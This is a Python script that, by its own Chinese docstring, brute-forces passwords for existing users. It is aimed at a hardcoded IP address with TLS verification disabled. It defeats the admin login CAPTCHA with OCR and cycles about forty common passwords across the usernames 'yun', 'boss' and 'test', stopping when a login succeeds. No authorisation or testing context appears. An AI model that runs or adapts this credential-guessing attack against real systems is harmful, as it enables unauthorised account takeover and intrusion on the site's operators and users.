#!/usr/bin/env python3
"""爆破存在用户的密码"""
import urllib.request, http.cookiejar, ssl, sys, time, json
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "https://101.201.82.174"
ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha():
    r = op.open(f"{B}/customer/admin/verify.html", timeout=8)
    return r.read()

def login(user, pwd, code):
    data = f"username={user}&password={pwd}&verify={code}".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/customer/admin/dologin.html", data=data), timeout=8)
        return json.loads(r.read().decode("utf-8","ignore"))
    except Exception as e:
        return {"status":-1,"msg":"HTTP500"}

users = ["yun","boss","test"]
passwords = ["123456","admin123","admin","12345678","admin888","yun123","yun123456",
             "boss123","test123","test123456","123123","admin666","admin@123",
             "zhilian123","zy123456","a123456","Aa123456","abc123","123456789",
             "password","111111","888888","kefu123","yun@123","boss@123","test@123",
             "yun888","boss888","test888","yunyun","bossboss","testtest",
             "1234567890","qwerty","1qaz2wsx","admin2024","admin2025","admin2026"]

for user in users:
    print(f"--- {user} ---", flush=True)
    for pw in passwords:
        hit = False
        for attempt in range(6):
            cap = get_captcha()
            code = ocr.classification(cap)
            if len(code) != 4: continue
            r = login(user, pw, code)
            msg = str(r.get("msg",""))
            if r.get("status") == 1:
                print(f"!!! 登录成功 {user}/{pw} code={code}", flush=True)
                sys.exit(0)
            elif "验证码" in msg:
                continue  # 验证码错,重试
            elif "密码" in msg or "账号" in msg:
                print(f"[密码错] {user}/{pw}", flush=True)
                hit = True
                break
            else:
                print(f"[?] {user}/{pw}: {r}", flush=True)
                hit = True
                break
            time.sleep(0.15)
        if hit: break
print("DONE")
